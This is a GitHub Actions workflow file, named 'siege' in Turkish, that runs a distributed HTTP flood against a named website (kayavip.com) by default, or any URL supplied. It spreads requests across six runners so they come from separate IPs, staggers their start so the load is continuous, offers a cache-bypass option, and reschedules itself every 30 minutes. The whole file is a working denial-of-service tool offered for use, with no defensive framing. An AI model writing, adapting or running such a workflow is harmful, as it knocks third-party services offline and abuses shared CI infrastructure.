name: kusatma

# Cok hedefli: url girdisi ile istenen site basilir.
# Her tur 50+ dakika kosar, 4 shard kademeli baslar -> kesintisiz baski.
# Zamanlanmis tur, elle tetiklenen turla ayni hedefe gidiyorsa siraya girer.
on:
  workflow_dispatch:
    inputs:
      url:
        description: "Hedef URL"
        default: "https://www.kayavip.com/"
      concurrency:
        description: "Shard basina eszamanli istek"
        default: "25"
      duration:
        description: "Saniye cinsinden sure"
        default: "3300"
      randomize:
        description: "Onbellek atlat (1/0)"
        default: "1"
  schedule:
    - cron: "*/30 * * * *"

concurrency:
  group: kusatma-${{ github.event.inputs.url || 'default' }}
  cancel-in-progress: false

jobs:
  blast:
    runs-on: ubuntu-latest
    timeout-minutes: 60
    strategy:
      fail-fast: false
      matrix:
        # Her shard ayri bir runner = ayri bir IP.
        shard: [1, 2, 3, 4, 5, 6]
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: "22"

      - name: Kademeli baslat
        run: sleep $(( ${{ matrix.shard }} * 7 ))

      - name: Baskiyi surdur
        env:
          U: ${{ github.event.inputs.url || 'https://www.kayavip.com/' }}
          C: ${{ github.event.inputs.concurrency || '25' }}
          D: ${{ github.event.inputs.duration || '3300' }}
          R: ${{ github.event.inputs.randomize || '1' }}
        run: node blast.mjs --url "$U" --concurrency "$C" --seconds "$D" --timeout 25000 $([ "$R" = "1" ] && echo --random)
